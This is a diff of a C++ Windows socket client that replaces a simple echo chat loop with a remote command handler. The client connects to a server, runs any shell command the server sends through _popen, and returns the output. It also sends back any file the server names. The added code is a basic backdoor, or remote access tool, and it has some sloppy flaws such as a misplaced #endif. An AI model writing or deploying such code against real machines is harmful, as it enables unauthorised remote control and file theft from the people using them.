@@ -2,15 +2,64 @@
 #include <WS2tcpip.h>
 #include <string>
 #include <inaddr.h>
+#include <fstream>
+#include <vector>
+
+#pragma warning(disable:4996)
 
 #pragma comment(lib, "ws2_32.lib")
 
+
+#ifdef _WIN32
+
 using namespace std;
+
+SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+
+
+int executeCommands(string commnads) {
+    char ch;
+    FILE* fpipe;
+    FILE* copy_fp;
+    FILE* tmp;
+    char* command = (char*)commnads.c_str();
+    copy_fp = fopen("C:\\C projects\\output_file_path.txt", "w");
+    fpipe = (FILE*)_popen(command, "r");
+    if (fpipe) {
+        while ((ch = fgetc(fpipe)) != EOF) {
+            fputc(ch, copy_fp);
+        }
+    }
+    else {
+        if (copy_fp) {
+            fprintf(copy_fp, "Sorry there was an error opening the file");
+        }
+    }
+    _pclose(fpipe);
+    fclose(copy_fp);
+    return 0;
+#endif
+}
+
+
+void giveFile(SOCKET socket, string fileName) {
+    const int BUFFER_SIZE = 1024;
+    vector<char> buffer(BUFFER_SIZE + 1, 0);
+    ifstream file(fileName, ifstream::binary);
+    while (true) {
+        file.read(buffer.data(), BUFFER_SIZE);
+        send(socket, buffer.data(), file.gcount(), 0);
+        if (!file)
+            break;
+    }
+    file.close();
+}
+
 
 
 void Client() {
     string ipAdress = "127.0.0.1"; //IP Address pf the server
-    int port = 7943; //Listtening port # on server
+    int port = 7613; //Listtening port # on server
 
 
     // Initialize Winsock
@@ -25,8 +74,8 @@ void Client() {
     }
 
     // Create socket
-
     SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+
     if (sock == INVALID_SOCKET) {
         cerr << "Cant create socket" << WSAGetLastError << endl;
         WSACleanup();
@@ -48,30 +97,35 @@ void Client() {
     }
 
     //Do-while loop to send and receive data
-    char buf[4096];
+    char buf[1024];
     string userInput;
 
-    do {
-        //Prompt the user for some text
-        cout << "> " << endl;
-        getline(cin, userInput);
+    while (true) {
+        ZeroMemory(buf, 1024);
+        int bytesRecived = recv(sock, buf, 1024, 0);
+        string command = string(buf, 0, bytesRecived);
 
-        //Send the text
-        if (userInput.size() > 0) {
-            int sendResault = send(sock, userInput.c_str(), userInput.size() + 1, 0);
-            if (sendResault != SOCKET_ERROR) {
-                // Wait fir response
-                ZeroMemory(buf, 4096);
-                int bytesRecived = recv(sock, buf, 4096, 0);
-                if (bytesRecived > 0) {
-                    // Echo  response to console
-                    cout << "Server " << string(buf, 0, bytesRecived) << endl;
-                }
+        if (command.find("cmd ") == 0) {
+            try {
+                command = command.substr(4, command.size() - 1);
+                executeCommands(command);
+                giveFile(sock, "C:\\C projects\\output_file_path.txt");
             }
-        }
+            catch (exception) {
+                string error = "Error with " + command + " command";
+                send(sock, error.c_str(), error.size() + 1, 0);
+            }
 
-        //Wait for response
-    } while (userInput.size() > 0);
+        }
+        else if (command.find("get file ") == 0) {
+            command = command.substr(9, command.size() - 1);
+            giveFile(sock, command);
+        }
+        else {
+            string problem{ "Cant find the command " + command };
+            send(sock, problem.c_str(), problem.size() + 1, 0);
+        }
+    }
 
     // Gracefully close down everything
     closesocket(sock);
@@ -80,6 +134,5 @@ void Client() {
 
 
 int main() {
-    cout << "Hello" << endl;
     Client();
 }
